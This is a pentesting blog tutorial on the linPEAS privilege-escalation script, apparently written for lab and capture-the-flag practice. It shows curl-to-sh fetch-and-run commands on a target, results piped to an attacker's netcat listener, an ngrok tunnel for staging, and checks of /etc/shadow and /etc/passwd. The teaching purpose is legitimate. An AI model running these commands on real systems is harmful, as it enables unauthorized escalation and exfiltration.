## Tools analysis: linPEAS

Linux local Privilege Escalation Awesome Script (linPEAS) is a script that search for possible paths to escalate privileges on Linux/Unix hosts.

###   ⚠**Disclaimer**⚠

> The tools, tests and procedures I showcase in this article should only be executed on your **own** system, lab environment or a system that you are **charged with protecting**. If ownership and responsibility lie with another party, be sure to get **clear written instructions** with **explicit permission** to conduct ethical hacking activities. **Do not** investigate individuals, websites, servers, or conduct any illegal activities on any system you do not have permission to analyze.
If you wish to try operations depicted in the following article, please make sure you understand what you are doing and take your own evaluation before executing any instructions.

.

> During research when writing this article I found out that people claimed they were failed the exams for using linPEAS for privilege escalation. So be cautious about it. **Using the linPEAS on the exam (ex. OSCP) can make you fail the exam**, but supposedly only when you use the version with automated privilege escalation. Read more about it in the [Reddit thread](https://www.reddit.com/r/oscp/comments/mw4idk/heads_up_dont_use_linpeas_on_the_exam/).

*Last update: 2021/05/17*

***
# Contents

1. [Obtaining linPEAS](#obtaining-linpeas)
2. [Usage examples](#usage-examples)
3. [Detailed analysis](#detailed-analysis)
4. [Questions? Suggestions?](#questions-suggestions)
5. [Additional readings](#additional-readings)
***

%%[patreon-btn]

# Obtaining linPEAS

Official GitHub repository: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

## Download only the script file

The way I use linPEAS is `wget`ting the single script file to its own directory alongside other operational applications in the `/opt/`. I keep it updated with `update.sh` script, so I can get the new version with one simple command.

```sh
# update.sh
$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -O linpeas.sh 
```

This way you download only the file you'll need. I found it as a perfect way of keeping up-to-date with these single-file tools, because I don't want to have full-blown Git repository with the history version.

To get linPEAS for the first time and for the later updates, just run `update.sh` script.

## Clone the repository

To get local copy one way is to clone a linPEAS [GitHub repository](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

```sh
$ mkdir linpeas
$ cd linpeas
$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git .
```

And update with the simple (assuming you didn't make any changes)

```sh
$ git pull
```

The major drawback is that it clones **whole** repository - linPEAS, winPEAS and other miscellaneous files.The advantage of this approach is that it will definitely work when linPEAS starts depending on another files.

## In-memory execution

When you don't want to store anything on your or any other machine that is a target of execution.

```sh
$ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

[Back to top](#contents) ⤴

# Usage examples

Depending on your needs you might want to try different approaches.

## Locally

Because why not? For my example - first I'm taking **the snapshot of my VM** just to make sure I can revert environment to the state before executing any pentesting tool on my daily system. I strongly advise you too, if you want to try it on your own.

```sh
$ sudo adduser --shell /usr/bin/zsh ckent
$ su ckent
$ sudo -l
Sorry, user ckent may not run sudo on kali.
```

Then execute linPEAS in the context of `ckent` and see what it returns.

```sh
$ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

> I'm using regular user account here, because this is how attacker will use it too - there is no point in running the privilege escalation script on account that has already elevated privileges.

## Internal network

When your target sees your host serving the linPEAS over Python simple server is a way to go. This is how I almost always execute linPEAS on Try Hack Me boxes over THM VPN.

```sh
# Host
$ mkdir pywww
$ cd pywww
$ cp /opt/linpeas/linpeas.sh .
$ python3 -m http.server 80 #python -m SimpleHTTPServer 80
```

```sh
# Target
$ curl {IP}/linpeas.sh | sh
```

If target machine have access to the internet and can access the linPEAS from GitHub - of course you can call it as previously.

## Public network

When you are targeting server via public IP, you cannot `curl` directly from your localhost, unless connection is tunneled via some external IP. The simplest way is combination of `ngrok` and Python server from the previous example.

> Download the executable from [the official site](https://ngrok.com/). You can find there also very informative manual. It is a very helpful application. One quick remark is that without registration `ngrok` allow creating time-limited HTTP/HTTPS tunnel to your host. When registered time limitation is lifted and `ngrok` can be used to create, for example, TCP connections.

The way I use it:

```sh
# Host #1
$ /opt/ngrok http 80

Session Status                online                                                                                   
Session Expires               1 hour, 59 minutes                                                                       
Version                       2.3.40                                                                                   
Region                        United States (us)                                                                       
Web Interface                 http://127.0.0.1:4040                                                                    
Forwarding                    http://01513f63ed1d.ngrok.io -> http://localhost:80                                      
Forwarding                    https://01513f63ed1d.ngrok.io -> http://localhost:80                                     
                                                                                                                       
Connections                   ttl     opn     rt1     rt5     p50     p90                                              
                              0       0       0.00    0.00    0.00    0.00
```

```sh
# Host #2
$ mkdir pywww
$ cd pywww
$ cp /opt/linpeas/linpeas.sh .
$ python3 -m http.server 80 #python -m SimpleHTTPServer 80
```

And from the target server I request the script using the external HTTP address `ngrok` generated - in this example it is `http://01513f63ed1d.ngrok.io`

```sh
$ curl http://01513f63ed1d.ngrok.io/linpeas.sh | sh
```

Of course, you can also `curl` it from the Github - but it is always safer to use something verified (`linPEAS` is often updated which can lead to some [unwanted results](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/))

## Redirecting output to the host

Useful trick is redirecting output of the script to your host. This is useful technique not only for linPEAS but for every other tool, script or a command you want to have the output of on your host. This requires `netcat` to be on the target server.

> Well, hypothetically because you can serve a `nc` binary and download it the same way as you do with the linPEAS script.

```sh
# Host
$ nc -lvnp 9002 | tee linpeas.out
```

```sh
# Target
$ curl {IP}/linpeas.sh | sh | nc {IP} 9002
```

> Sometimes this doesn't work so before that validate `nc` can connect via the specified port. If that is successful, continue. If not, change the port. I've encountered this in one or two boxes when I had to use "legit" port like 443.

[Back to top](#contents) ⤴

# Detailed analysis

> I'm describing only sections that I can make use of. If you know other useful usages of linPEAS or I've made a mistake, please notify me in the comment section and I'll update the article.

As I have stated before - linPEAS is great for learning purposes or quick privilege escalation checks. Especially if you are aiming for pentesting exams - it is way more beneficial to understand **how** such scripts as linPEAS works. From my experience so far, I always could figure things out without linPEAS, if I would remember such commands like `sudo -l`.

Let's review the output of the linPEAS.

> More can be found on the Hacktricks page in [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation) section.


![lp_00000.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621192689256/3jOAaPXi6.png)

We are greeted by linPEAS with its cute icon and small legend of the color outputs.

## System Information

![lp_00001.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621192700737/X_3X8Uj3A.png)

* all useful details about operating system and its distribution, versions and release
* `sudo` version
* if system is running from the VM system (and what system it is)

### Alternatives

```sh
$ lsb_release -a 
$ hostnamectl # includes virtualization info

$ sudo --version
```

## Available software

![lp_00003.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621192716741/NcE1JlPvc.png)

* list of accessible software picked from the predefined list:

```text
nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch ctr
```

### Alternatives

Visual check from these directories

```sh
$ ls /usr/bin
$ ls /usr/sbin
```

## Processes, Cron, Services, Timers & Sockets

![lp_00004.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621192729814/lKd3d1QXq.png)

* list of running processes - very useful when checking for privilege escalation from vulnerable software run as root

### Alternatives

```sh
$ ps -U root -u root u # every process running as root (real & effective ID)
```

## Network Information

![lp_00005.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621192738363/F-NLkcL_B.png)

* `/etc/hosts` entries, useful to see other domains or applications
* connected interfaces
* open ports - always good to check if something didn't come up hidden during recon phase

### Alternatives

```sh
$ cat /etc/hosts
$ ip addr
$ sudo netstat -tulpn | grep LISTEN # didn't find a way get open ports without sudo
```

## User Information

![lp_00006.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621192746814/YPANpZ0SS.png)

* basic current user information, groups assignments and its sudoer status
* clipboard data if `xsel` and `xclip` available
* users with console

![lp_00007.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621192754651/9T25QI2-c.png)

* linPEAS specifically reminds about checking other shell accounts for horizontal (or even vertical) privilege escalation

### Alternatives

```sh
$ id
$ sudo -l # very, very useful command for quick priv esc
$ su {user}
$ cat /etc/passwd
```

## Software Information

![lp_00008.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621192761142/jWDWd4PfK.png)

* useful when looking for vulnerable software

### Alternatives

I don't know any commands, so how you approach this depends on your experience and knowledge - what to look for and which apps are worth poking.

## Interesting Files

![lp_00009.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621192767895/oTIcZPzY_.png)

* lists some popular attack vectors - if something is red it doesn't mean it is vulnerable, only that it _can_ be vulnerable
* shows some possible username, password or hashes findings in various files

### Alternatives

Not many, just a pure experience and knowledge. Check for `/etc/shadow` and `/root/` read permissions, hashes in `/etc/passwd` or if this file is writable.

> Like what you see? Join the [Hashnode.com](https://hashnode.com/@Asentinn/join) now. Things that are awesome:

>✔ Automatic GitHub Backup

>✔ Write in Markdown

>✔ Free domain mapping

>✔ CDN hosted images

>✔ Free in-built newsletter service

> By using my link you can help me unlock the ambasador role, which gives me some additional features to support my content creation mojo.

[Back to top](#contents) ⤴

# Questions? Suggestions?

And you? Are you familiar with the linPEAS? How do you use it? Do you think it is more like beginner or advanced tool?

> 👍 Please do share in the comments below and show your support by giving a like! 

> 🔔 `CyberEthical.Me` is maintained purely from your donations - consider one-time sponsoring on the [Sponsor](/sponsor) button or 🎁 [become a Patron](https://www.patreon.com/bePatron?u=57522747) which also gives you some bonus perks.

# Additional readings

> 📌 Follow the `#CyberEthical` hashtag on the social media

> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)

> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)

> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)

* [linPEAS @ GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
* [linPEAS eligibility on the exams](https://www.reddit.com/r/oscp/comments/mw4idk/heads_up_dont_use_linpeas_on_the_exam/)
* [Understanding pentest tools and scripts you are using](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/)

[Back to top](#contents) ⤴
